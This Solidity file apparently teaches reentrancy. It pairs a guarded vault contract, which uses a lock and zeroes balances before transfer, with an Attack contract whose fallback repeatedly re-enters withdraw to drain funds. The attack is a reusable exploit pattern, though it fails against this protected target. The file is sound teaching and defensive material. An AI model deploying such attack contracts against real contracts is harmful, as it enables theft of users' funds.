// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10; 


contract ReEntrancy
{
   mapping(address=>uint256) public balances;
   bool public locked = false;

   error NoBalance();
   error TransferFailed();

   function deposit() public payable
   {
       balances[msg.sender]+=msg.value;
   }

   modifier reentrancy_guard()
   {
       require(locked == false , "no reentrancy");
       locked = true;
       _;
       locked = false;
   }


   function withdraw() public reentrancy_guard
   {
     require(locked == true , "reentrancy attack");
      if(balances[msg.sender]<=0)
      {
          revert NoBalance();
      }
      uint256 amount = balances[msg.sender];
      balances[msg.sender] = 0;
      
      (bool result,) = payable(msg.sender).call{value:amount}("");
      if(result == false)
      {
           revert TransferFailed();
      }
      
      // reentrancy guard modifier is really important so that no attack will happen 
      // if balances[msg.sender] = 0  is done in this line then there would be a reentrancy attack and money in this account would have be stolen
   } 


   function getbalance() public view returns(uint256)
   {
       return address(this).balance;
   }

}

contract Attack
{

   ReEntrancy public reentrancy;

   constructor(address reentrancy_address)
   {
       reentrancy = ReEntrancy(reentrancy_address);
   }

   function attack () public payable
   {
        require(msg.value>=1 ether);
        reentrancy.deposit{value: 1 ether}();
        reentrancy.withdraw();
   }

   fallback() external payable
   {

      if(address(reentrancy).balance >= 1 ether)
      {
         reentrancy.withdraw();
      }

   }

   receive() external payable{}


   function getbalance() public view returns(uint256)
   {
       return address(this).balance;
   }


}
